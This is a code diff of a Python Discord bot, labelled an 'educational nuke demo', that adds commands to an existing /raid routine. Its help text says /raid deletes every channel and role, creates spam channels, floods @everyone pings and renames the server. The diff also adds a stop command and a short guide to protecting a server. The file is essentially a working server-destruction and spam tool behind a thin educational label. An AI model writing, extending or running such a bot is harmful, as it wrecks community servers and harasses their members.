@@ -1,3 +1,23 @@
+import discord
+from discord.ext import commands
+import asyncio
+import os
+
+# ========== CONFIGURATION ==========
+TOKEN = os.getenv("DISCORD_TOKEN")
+OWNER_ID = 1088143400496279552
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=".", intents=intents)
+
+active_demo = {}
+
+@bot.event
+async def on_ready():
+    await bot.tree.sync()
+    print(f"✅ Educational Demo Bot ready - {bot.user}")
+    print(f"Owner ID: {OWNER_ID}")
+
 @bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
 async def raid(
     interaction: discord.Interaction,
@@ -85,10 +105,12 @@ async def raid(
                        f"💬 **{messages_sent} spam messages** sent\n"
                        f"🔔 **@everyone pings**: {'ON' if ping_enabled else 'OFF'}\n\n"
                        f"**🚨 PROTECT YOUR SERVER:**\n"
-                       f"• NEVER give Admin to untrusted bots\n"
-                       f"• Use 2FA on admin accounts\n"
+                       f"• NEVER give Administrator to untrusted bots\n"
+                       f"• Use 2FA on all administrator accounts\n"
                        f"• Set verification level to HIGH\n"
-                       f"• Use backup bots (Xenon)",
+                       f"• Use backup bots (like Xenon) to save server structure\n\n"
+                       f"**⚠️ This was an EDUCATIONAL DEMO on a TEST server**\n"
+                       f"Delete this server to clean up.",
             color=discord.Color.red()
         )
         await log_channel.send(embed=embed)
@@ -104,3 +126,66 @@ async def raid(
         await log_channel.send(f"❌ Error: {e}")
     finally:
         active_demo[guild.id] = False
+
+@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
+async def stopraid(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
+    
+    if interaction.guild.id in active_demo:
+        active_demo[interaction.guild.id] = False
+        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
+    else:
+        await interaction.response.send_message("No active demo.", ephemeral=True)
+
+@bot.tree.command(name="protect", description="How to protect your server from nuke bots")
+async def protect(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="🛡️ How to Protect Your Server from Nuke Bots",
+        description="Educational security guide",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
+                    value="Review permissions before inviting any bot.", inline=False)
+    embed.add_field(name="2. Enable 2FA", 
+                    value="All administrator accounts must have 2FA enabled.", inline=False)
+    embed.add_field(name="3. Server Verification Level", 
+                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
+    embed.add_field(name="4. Use Backup Bots", 
+                    value="Xenon can save/restore your entire server structure.", inline=False)
+    embed.add_field(name="5. Audit Logs", 
+                    value="Check audit logs regularly for mass channel creation or deletion.", inline=False)
+    embed.add_field(name="6. Emergency Roles", 
+                    value="Create a role with 'Manage Channels' that can stop raids quickly.", inline=False)
+    embed.set_footer(text="Educational purposes only - Stay safe!")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=False)
+
+@bot.tree.command(name="commands", description="Show all commands")
+async def cmd_list(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="Educational Nuke Demo Bot",
+        description="⚠️ EDUCATIONAL ONLY - Run on test servers",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="/raid [message] [ping] [amount]", 
+                    value="Start nuke demonstration:\n"
+                          "• Deletes ALL channels\n"
+                          "• Creates 100 spam channels\n"
+                          "• Spams your message\n"
+                          "• Renames server\n"
+                          "• Deletes all roles\n\n"
+                          "Example: `/raid message:\"GET NUKED\" ping:yes amount:10000`", 
+                    inline=False)
+    embed.add_field(name="/stopraid", value="Emergency stop the demo", inline=False)
+    embed.add_field(name="/protect", value="Show server protection guide", inline=False)
+    embed.add_field(name="/commands", value="Show this help", inline=False)
+    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Shows why you should NEVER give Admin to untrusted bots")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=False)
+
+if __name__ == "__main__":
+    if not TOKEN:
+        print("ERROR: DISCORD_TOKEN not set")
+        exit(1)
+    bot.run(TOKEN)
